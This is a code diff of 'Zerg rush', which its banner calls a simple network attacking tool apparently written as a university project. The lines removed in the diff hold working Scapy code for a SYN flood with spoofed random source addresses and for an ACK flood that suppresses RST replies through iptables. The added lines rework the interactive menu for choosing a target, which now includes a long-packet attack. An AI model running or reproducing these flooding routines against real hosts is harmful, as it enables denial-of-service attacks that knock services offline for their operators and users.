@@ -1,35 +1,3 @@
-from scapy.all import*
-import os
-
-def syn_flood(src, dst, dport):
-    print("[*] Initiating SYN flood attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
-    srcIP = RandIP("192.168.1.1/24")
-    srcPort = RandShort()
-    ip = IP(src = srcIP, dst = dst)
-    tcp = TCP(sport = srcPort, dport = dport, flags = "S")
-    raw = Raw(b"X"*1024)
-    SYN = ip/ tcp/ raw
-    print("\n[*] sending SYN packets.")
-    send(SYN, loop = 1, verbose = 0)
-
-def ACK_attack(src, dst, dport):
-    print("[*] Initiating ACK attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
-    cmd = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
-    os.system(cmd)
-    try:
-        while(True):
-            #syn
-            sport = random.randint(1024, 65535)
-            ip = IP(src = src, dst = dst)
-            SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
-            SYNACK=sr1(ip/SYN)
-
-            #ack
-            ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
-            send(ip/ACK)
-    except KeyboardInterrupt:
-        os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
-
 def selection(src, dst, dport):
     os.system("clear -x")
     print("""
@@ -37,35 +5,75 @@ def selection(src, dst, dport):
     |   __________                           __________             .__         |
     |   \____    /___________  ____          \______   \__ __  _____|  |__      |
     |     /     // __ \_  __ \/ ___\   ______ |       _/  |  \/  ___/  |  \     |
-    |    /     /\  ___/|  | \/ /_/  > /_____/ |    |   \  |  /\___ \|   Y  \    | \0
+    |    /     /\  ___/|  | \/ /_/  > /_____/ |    |   \  |  /\___ \|   Y  \    |
     |   /_______ \___  >__|  \___  /          |____|_  /____//____  >___|  /    |
     |           \/   \/     /_____/                  \/           \/     \/     |
     +---------------------------------------------------------------------------+
     |           Welcome to Zerg rush, a simple network attacking tool.          |
     +---------------------------------------------------------------------------+
                                                             Peter Lee, UIUC 2022""")
-    print("[*] Attack information:\n    Attacker IP: "+src+"\n    Target IP: "+dst+"\n    Target port number: "+str(dport)+"\n")
-    print("[*] Please select options below:\n    1. SYN flood attack\n    2. ACK flood attack\n    3. Modify attacker IP address\n    4. Modify target IP address\n    5. Modify target port number")
-    foo = 0
-    foo = input("> ")
-    print("[*] You have selected "+foo)
-    if foo == "1":
-        syn_flood(src, dst, dport)
-    elif foo == "2":
-        ACK_attack(src, dst, dport)
-    elif foo == "3":
-        src = input("Enter new attacker IP address below\n> ")
-        selection(src, dst, dport)
-    elif foo == "4":
-        dst = input("Enter new target IP address below\n> ")
-        selection(src, dst, dport)
-    elif foo == "5":
-        dport = input("Enter new target port number below\n> ")
-        selection(src, dst, dport)
 
-src = sys.argv[1]
-dst = sys.argv[2]
-dport = int(sys.argv[3])
-#print("[*] Attack information:\n    Attacker IP: "+src+"\n    Target IP: "+dst+"\n    Target port number: "+str(dport))
-#print("[*] Please select options below:\n    1. SYN flood attack\n    2. ACK flood attack\n    3. Modify attacker IP address\n    4. Modify target IP address\n    5. Modify target port number")
-selection(src, dst, dport)
+    # if destination port is normal, promopt normal info
+    if (dport != -1):
+        print("[*] Attack information:\n    Attacker IP: "+src+"\n    Target IP: "+dst+"\n    Target port number: "+str(dport)+"\n")
+    else:
+        print("[*] Attack information:\n    Attacker IP: "+src+"\n    Target IP: "+dst+"\n    Target port number: NULL\n")
+
+    # cases for when user argument does not exist
+    if (src == "NULL"):
+        print("[!] Attacker IP address is NULL. Please use opiton 3 to enter argument.")
+    if (dst == "NULL"):
+        print("[!] Target IP address is NULL. Please use opiton 3 to enter argument.")
+    if (dport == int("-1")):
+        print("[!] Target port is NULL. Please use opiton 3 to enter argument.\n")
+    print("[*] Please select options below:\n    0. Long packet attack\n    1. SYN flood attack\n    2. ACK flood attack\n    3. Modify attacker IP address\n    4. Modify target IP address\n    5. Modify target port number")
+
+    foo = input("\nzRush > ")
+    print("\n[*] You have selected "+foo)
+    match foo:
+        case "0":
+            uin = input("Enter starting power of 2:\nzRush > ")
+            lpacket_raw(src,dst, dport, uin)
+        case "1":
+            syn_flood(src, dst, dport)
+        case "2":
+            ACK_attack(src, dst, dport)
+        case "3":
+            tmp = src
+            src = input("Enter new attacker IP address or \"back\" below\n\nzRush > ")
+            if (src == "back"):
+                selection(tmp, dst, dport)
+            else:
+                selection(src, dst, dport)
+        case "4":
+            tmp = dst
+            dst = input("Enter new target IP address or \"back\" below\n\nzRush > ")
+            if (dst == "back"):
+                selection(src, tmp, dport)
+            else:
+                selection(src, dst, dport)
+        case "5":
+            tmp = dport
+            dport = input("Enter new target port number or \"back\" below\n\nzRush > ")
+            if (dport == "back"):
+                selection(src, dst, tmp)
+            else:
+                selection(src, dst, dport)
+    selection(src,dst,dport)
+
+if __name__ == "__main__":
+    from scapy.all import*
+    from attacks import *
+    import os
+    import time
+
+    try:
+        src = sys.argv[1]
+        dst = sys.argv[2]
+        dport = int(sys.argv[3])
+    except:
+        src = "NULL"
+        dst = "NULL"
+        dport = int("-1")
+
+    selection(src, dst, dport)
